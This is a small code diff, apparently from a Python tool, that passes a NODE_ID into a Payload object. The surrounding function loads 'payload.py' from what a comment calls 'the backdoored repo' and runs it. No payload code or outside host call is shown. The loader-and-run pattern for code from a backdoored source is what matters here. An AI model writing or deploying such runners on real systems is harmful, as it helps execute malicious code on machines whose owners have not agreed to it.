@@ -66,7 +66,7 @@ def run_payload(repo_dir):
     # the backdoored repo isn't on our path so load it's source directly so we can use it
     payload_module = imp.load_source('payload', os.path.join(repo_dir, 'payload.py'))
 
-    payload = payload_module.Payload()
+    payload = payload_module.Payload(NODE_ID)
     payload.run()
     payload.save_results()
     return payload
